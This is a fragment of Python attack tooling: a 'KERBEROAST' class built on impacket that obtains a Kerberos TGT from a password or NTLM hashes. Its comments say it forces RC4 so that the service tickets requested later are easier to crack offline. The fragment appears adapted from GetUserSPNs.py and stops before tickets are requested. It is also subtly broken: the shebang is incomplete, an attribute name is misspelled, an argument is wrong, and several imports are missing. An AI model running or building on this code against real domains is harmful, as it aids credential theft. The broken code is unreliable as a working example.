#!/usr/bin/env
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS

class KERBEROAST:
    def __init__(self, args):
        self.__args = args
        self.__username = args.username
        self.__password = args.password
        self.__domain = args.domain
        self.__use_kerberos = args.use_keberos
        self.__use_ldaps = args.use_ldaps
        self.__lmhash = args.lmhash
        self.__nthash = args.nthash
        self.__aesKey = args.auth_aes_key
        self.__kdcHost = args.dc_ip

    # GetUserSPNS.py
    def getTGT(self):
        domain, _, TGT, _ = CCache.parseFile(self.__domain)
        if TGT is not None:
            return TGT

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                compute_lmhash(self.__password),
                                                                compute_nthash(self.__password), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
            except Exception as e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcHost)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash),
                                                                unhexlify(self.__nthash), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT
